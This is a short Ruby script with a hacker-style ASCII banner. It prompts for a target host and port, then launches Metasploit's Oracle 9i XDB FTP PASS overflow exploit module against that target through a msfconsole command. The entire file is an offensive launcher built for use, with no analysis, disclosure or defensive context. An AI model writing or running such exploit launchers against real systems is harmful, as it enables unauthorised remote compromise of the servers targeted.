require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
      Oracle 9i XDB FTP PASS Overflow (win32)
            Oracle 9.2.0.1 Universal
""".red
puts """
          Automatic Target Port 21
""".white
   

puts " [?] What is the target? ".blue
print "[!] ---> ".white

target = gets.chomp

puts " [?] What is the port? [Default 2100] ".blue
print " [!] ---> ".yellow

port = gets.chomp

exec("msfconsole -x 'use exploit/windows/ftp/oracle9i_xdb_ftp_pass' -x 'setg RHOST #{target}'  -x 'setg RPORT #{port}' -x 'run'")

